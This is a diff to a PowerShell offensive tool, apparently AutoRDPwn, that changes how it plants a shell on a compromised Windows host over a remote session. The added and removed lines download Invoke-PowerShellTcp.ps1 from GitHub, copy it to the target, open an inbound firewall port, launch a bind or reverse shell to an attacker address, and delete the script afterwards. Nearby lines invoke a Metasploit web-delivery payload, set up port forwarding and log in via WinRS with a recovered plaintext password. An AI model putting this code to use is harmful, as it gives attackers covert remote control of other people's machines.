@@ -561,18 +561,21 @@ Write-Host "==================== Metasploit Web Delivery =======================
 Invoke-MetasploitPayload "http://$using:metaserver`:4433/$using:metarandom" -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500 ; del .\Invoke-MetasploitPayload.ps1 }}
 
-if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
+if ($netcat -in 'local'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1')
+invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
+Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Bind -Port $using:ncport }}
-
-if ($netcat -in 'remote'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
+Invoke-PowerShellTcp -Bind -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
+ 
+if ($netcat -in 'remote'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1')
+invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1 ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500
-Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport }}
+Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
